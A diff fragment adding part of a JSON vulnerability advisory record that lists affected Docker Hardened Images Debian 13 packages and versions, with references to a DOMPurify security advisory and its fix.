+        "4.22.10-r1",
+        "4.22.10-r2",
+        "4.22.12-r1",
+        "4.22.13-r0",
+        "4.22.13-r1",
+        "4.22.14-r0",
+        "4.22.15-r0",
+        "4.22.15-r1",
+        "4.22.15-r2",
+        "4.22.16-r0",
+        "4.22.16-r1",
+        "4.22.16-r2",
+        "4.22.17-r0",
+        "4.22.17-r1",
+        "4.22.17-r2",
+        "4.22.19-r0",
+        "4.22.19-r1",
+        "4.22.22-r0",
+        "4.22.22-r1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "datahub-ingestion",
+        "purl": "pkg:deb/dhi/datahub-ingestion"
+      },
+      "versions": [
+        "1.5.0.7-0",
+        "1.6.0.1-0",
+        "1.6.0.1-1",
+        "1.6.0.1-2",
+        "1.6.0.1-3",
+        "1.6.0.2-0",
+        "1.6.0.2-1",
+        "1.7.0.10-0",
+        "1.7.0.12-0",
+        "1.7.0.13-0",
+        "1.7.0.14-0",
+        "1.7.0.14-1",
+        "1.7.0.14-2",
+        "1.7.0.16-0",
+        "1.7.0.16-1",
+        "1.7.0.17-0",
+        "1.7.0.17-1",
+        "1.7.0.17-2",
+        "1.7.0.17-3",
+        "1.7.0.18-0",
+        "1.7.0.19-0",
+        "1.7.0.19-1",
+        "1.7.0.19-2",
+        "1.7.0.19-3",
+        "1.7.0.19-4",
+        "1.7.0.19-5",
+        "1.7.0.19-6"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "dependencytrack-frontend-4",
+        "purl": "pkg:deb/dhi/dependencytrack-frontend-4"
+      },
+      "versions": [
+        "4.14.4-0",
+        "4.14.5-0",
+        "4.14.5-1",
+        "4.14.5-2",
+        "4.14.5-3",
+        "4.14.5-4",
+        "4.14.5-5",
+        "4.14.5-6",
+        "4.14.6-0",
+        "4.14.6-1",
+        "4.14.6-2"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "dependencytrack-frontend-5",
+        "purl": "pkg:deb/dhi/dependencytrack-frontend-5"
+      },
+      "versions": [
+        "5.1.1-0",
+        "5.1.2-0",
+        "5.2.0-0",
+        "5.2.0-1",
+        "5.2.0-2",
+        "5.2.0-3",
+        "5.2.0-4",
+        "5.2.0-5",
+        "5.2.0-6",
+        "5.2.0-7",
+        "5.2.1-0",
+        "5.2.1-1",
+        "5.2.1-2"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "forklift-console-plugin",
+        "purl": "pkg:deb/dhi/forklift-console-plugin"
+      },
+      "versions": [
+        "2.11.7-0",
+        "2.11.7-1",
+        "2.11.7-2",
+        "2.11.7-3",
+        "2.12.10-0",
+        "2.12.10-1",
+        "2.12.10-2",
+        "2.12.10-3",
+        "2.12.10-4",
+        "2.12.10-5",
+        "2.12.10-6",
+        "2.12.10-7",
+        "2.12.10-8",
+        "2.12.11-0",
+        "2.12.11-1",
+        "2.12.11-2",
+        "2.12.11-3",
+        "2.12.11-4",
+        "2.12.11-5"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "grist",
+        "purl": "pkg:deb/dhi/grist"
+      },
+      "versions": [
+        "1.7.17-0",
+        "1.7.17-1",
+        "1.7.17-2",
+        "1.7.17-3",
+        "1.7.17-4",
+        "1.7.17-5",
+        "1.7.17-6",
+        "1.7.19-2",
+        "1.7.19-3",
+        "1.7.19-4",
+        "1.7.19-5",
+        "1.7.19-6",
+        "1.7.20-0",
+        "1.7.20-10",
+        "1.7.20-7",
+        "1.7.20-8",
+        "1.7.20-9",
+        "1.7.21-0",
+        "1.7.21-1",
+        "1.7.21-2",
+        "1.7.21-3",
+        "1.7.21-4",
+        "1.7.21-5",
+        "1.7.21-6",
+        "1.7.21-7",
+        "1.7.21-8",
+        "1.7.21-9",
+        "1.7.22-1",
+        "1.7.22-10",
+        "1.7.22-2",
+        "1.7.22-3",
+        "1.7.22-4",
+        "1.7.22-5",
+        "1.7.22-6",
+        "1.7.22-7",
+        "1.7.22-8",
+        "1.7.22-9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "kibana-9.4",
+        "purl": "pkg:deb/dhi/kibana-9.4"
+      },
+      "versions": [
+        "9.4.5-1",
+        "9.4.7-0",
+        "9.4.8-0",
+        "9.4.8-1",
+        "9.4.8-11",
+        "9.4.8-12",
+        "9.4.8-13",
+        "9.4.8-14",
+        "9.4.8-2",
+        "9.4.8-3",
+        "9.4.8-4",
+        "9.4.8-5",
+        "9.4.8-6",
+        "9.4.8-7",
+        "9.4.8-8",
+        "9.4.8-9",
+        "9.4.9-0"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "kibana-9.5",
+        "purl": "pkg:deb/dhi/kibana-9.5"
+      },
+      "versions": [
+        "9.5.5-0",
+        "9.5.5-1",
+        "9.5.5-10",
+        "9.5.5-11",
+        "9.5.5-12",
+        "9.5.5-2",
+        "9.5.5-3",
+        "9.5.5-4",
+        "9.5.5-5",
+        "9.5.5-6",
+        "9.5.5-7",
+        "9.5.5-9",
+        "9.5.6-0"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "langfuse-2",
+        "purl": "pkg:deb/dhi/langfuse-2"
+      },
+      "versions": [
+        "2.95.12-0",
+        "2.95.12-1",
+        "2.95.12-10",
+        "2.95.12-11",
+        "2.95.12-2",
+        "2.95.12-3",
+        "2.95.12-4",
+        "2.95.12-5",
+        "2.95.12-6",
+        "2.95.12-7",
+        "2.95.12-8",
+        "2.95.12-9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "llama-cpp-0",
+        "purl": "pkg:deb/dhi/llama-cpp-0"
+      },
+      "versions": [
+        "0.6.0-0",
+        "0.7.0-0",
+        "0.7.0-1",
+        "0.7.0-2",
+        "0.7.0-3",
+        "0.7.0-4",
+        "0.7.0-5",
+        "0.7.0-6",
+        "0.7.0-7",
+        "0.8.0-0",
+        "0.8.0-1",
+        "0.9.0-0",
+        "0.9.0-1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "opencost-ui",
+        "purl": "pkg:deb/dhi/opencost-ui"
+      },
+      "versions": [
+        "1.121.0-0",
+        "1.121.1-0",
+        "1.121.1-1",
+        "1.121.1-2",
+        "1.121.2-0",
+        "1.121.3-0",
+        "1.121.3-2",
+        "1.121.3-3",
+        "1.121.3-4",
+        "1.121.3-5",
+        "1.121.3-6",
+        "1.121.3-7",
+        "1.121.4-0"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "supabase-studio",
+        "purl": "pkg:deb/dhi/supabase-studio"
+      },
+      "versions": [
+        "2026.08.03-0",
+        "2026.09.07-0",
+        "2026.09.07-1",
+        "2026.09.07-2",
+        "2026.09.07-4",
+        "2026.09.07-5",
+        "2026.10.12-0",
+        "2026.10.12-1",
+        "2026.10.12-2",
+        "2026.11.02-0"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "superset",
+        "purl": "pkg:deb/dhi/superset"
+      },
+      "versions": [
+        "6.1.0-0",
+        "6.1.0-1",
+        "6.1.0-10",
+        "6.1.0-11",
+        "6.1.0-12",
+        "6.1.0-13",
+        "6.1.0-14",
+        "6.1.0-15",
+        "6.1.0-16",
+        "6.1.0-17",
+        "6.1.0-18",
+        "6.1.0-19",
+        "6.1.0-2",
+        "6.1.0-20",
+        "6.1.0-21",
+        "6.1.0-22",
+        "6.1.0-23",
+        "6.1.0-24",
+        "6.1.0-25",
+        "6.1.0-26",
+        "6.1.0-27",
+        "6.1.0-28",
+        "6.1.0-29",
+        "6.1.0-3",
+        "6.1.0-30",
+        "6.1.0-31",
+        "6.1.0-32",
+        "6.1.0-33",
+        "6.1.0-34",
+        "6.1.0-35",
+        "6.1.0-36",
+        "6.1.0-37",
+        "6.1.0-38",
+        "6.1.0-4",
+        "6.1.0-5",
+        "6.1.0-6",
+        "6.1.0-7",
+        "6.1.0-8",
+        "6.1.0-9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "uptime-kuma-1",
+        "purl": "pkg:deb/dhi/uptime-kuma-1"
+      },
+      "versions": [
+        "1.23.17-0",
+        "1.23.17-1",
+        "1.23.17-2",
+        "1.23.17-3",
+        "1.23.17-4",
+        "1.23.17-5",
+        "1.23.17-6",
+        "1.23.17-7",
+        "1.23.17-8",
+        "1.23.17-9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "uptime-kuma-2",
+        "purl": "pkg:deb/dhi/uptime-kuma-2"
+      },
+      "versions": [
+        "2.5.0-0",
+        "2.5.0-1",
+        "2.5.0-2",
+        "2.5.3-0",
+        "2.5.3-1",
+        "2.5.4-0",
+        "2.5.5-0",
+        "2.5.5-1",
+        "2.5.6-0",
+        "2.5.7-0",
+        "2.5.7-1",
+        "2.5.9-0",
+        "2.5.9-1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-g2qx-syoq-rb6m-uplm"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-c6gr-qvv4-5v3f"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/cure53/DOMPurify/security/advisories/GHSA-c6gr-qvv4-5v3f"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/cure53/DOMPurify/pull/1672"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/cure53/DOMPurify/commit/a77a3e78b59f72fa4d1c83f22e121ad9cc7d3575"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/cure53/DOMPurify/releases/tag/3.4.17"
+    }
+  ]
+}
